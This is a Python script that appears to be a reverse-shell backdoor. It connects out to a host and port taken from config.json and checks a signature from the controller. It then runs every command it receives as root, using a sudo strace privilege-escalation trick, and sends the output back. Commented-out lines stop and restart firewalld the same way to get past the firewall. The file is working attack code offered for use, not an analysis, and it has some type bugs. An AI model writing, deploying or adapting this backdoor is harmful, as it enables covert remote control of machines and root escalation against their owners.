import socket
import os
import subprocess
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
import json

PSS = padding.PSS(
    mgf=padding.MGF1(hashes.SHA256()),
    salt_length=padding.PSS.MAX_LENGTH,
)
with open("client_public.pem", "rb") as key_file:
    public_key = serialization.load_pem_public_key(key_file.read())

with open("config.json") as file:
    config = json.load(file)

host = config["host"]
port = config["port"]

#disable firewall (cant connect w/o)
#utilizes strace vuln to use systemctl as root
#os.system('sudo strace -o /dev/null /bin/sh -c "systemctl stop firewalld"')
# next create a socket object 
s = socket.socket()         
print ("Socket successfully created") 

while True:
    try:
        s.connect((host,port))
    except Exception:
        continue
    break
# a forever loop until we interrupt it or 
# an error occurs 
while True: 

# Establish connection with client. 
  
  request_to_sign = os.urandom(32)
  s.sendall(request_to_sign)

  signature = s.recv(1024)
  public_key.verify(signature, request_to_sign, PSS, hashes.SHA256())

  s.send('Thank you for connecting'.encode()) 
  while True:
      cmd = s.recv(8024).decode("utf-8").strip()
      inputcmd = ["sudo","strace","-o","/dev/null","/bin/sh","-c", cmd]
      if cmd == "close":
        s.send("Closing connection")
        break

      output = subprocess.check_output(inputcmd)
      message = "Output is: " + output
      s.send(message.encode())
      
  # Close the connection with the client 
  s.close()
  #os.system('sudo strace -o /dev/null /bin/sh -c "systemctl start firewalld"')

  
  # Breaking once connection closed
  break
